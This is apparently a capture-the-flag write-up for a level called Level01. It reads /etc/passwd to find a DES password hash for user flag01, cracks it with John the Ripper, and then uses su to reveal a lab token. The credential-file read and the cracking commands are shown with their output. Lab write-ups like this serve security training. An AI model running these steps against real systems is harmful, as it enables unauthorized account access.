[README.md](../README.md)
# Level01

```sh
cat /etc/passwd

OR

getent passwd flag01
```

`flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash`

Using a tool like [John the Ripper password cracker](https://www.openwall.com/john/) we can crack the password in 10ms.

```sh
└─# echo '42hDRfypTqqnw' > pass.txt


└─# john pass.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
abcdefg          (?)
1g 0:00:00:00 DONE 2/3 (2024-02-17 13:59) 33.33g/s 3276Kp/s 3276Kc/s 3276KC/s 123456..Nelson8
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```sh
su flag01
Check flag. Here is your token: f2av5il02puano7naaf6adaaf
```